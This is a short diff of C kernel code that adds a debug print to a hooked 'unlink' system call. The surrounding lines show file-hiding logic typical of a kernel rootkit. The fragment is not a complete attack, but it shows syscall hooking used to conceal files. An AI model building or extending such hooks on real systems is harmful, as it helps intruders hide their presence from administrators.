@@ -169,6 +169,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
     int i, j;
     char *value;
     
+    printk("unlink %s %d\n", filename, moni_unlink);
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
         value = (char*) vmalloc(strlen(INEXISTFILE) * sizeof(char*));
